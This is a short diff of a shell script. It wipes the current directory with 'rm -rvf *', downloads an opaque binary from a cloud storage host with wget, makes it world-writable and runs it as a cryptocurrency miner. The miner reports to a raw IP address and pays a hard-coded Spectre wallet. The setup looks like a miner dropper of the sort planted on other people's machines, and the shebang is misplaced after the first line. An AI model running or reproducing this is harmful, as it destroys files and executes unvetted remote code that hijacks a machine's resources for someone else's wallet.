@@ -1,8 +1,8 @@
-rm -rvf * && mkdir dd && cd dd
+rm -rvf * 
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
-wget https://majza.nyc3.digitaloceanspaces.com/Tnn0.4.0 > /dev/null 2>&1 &
+wget https://majza.nyc3.digitaloceanspaces.com/Tnn0.4.0 
 chmod 777 Tnn0.4.0
 ./Tnn0.4.0 --daemon-address 157.245.1.139 --port 80 --worker-name $(shuf -n 1 -i 1-999)-Bismillah --spectre --wallet spectre:qzlnaweyxxpjmh7xp66n62j7lu008xqeytm4npxskezhx92u52jzuwv39q8zt
 sleep 30
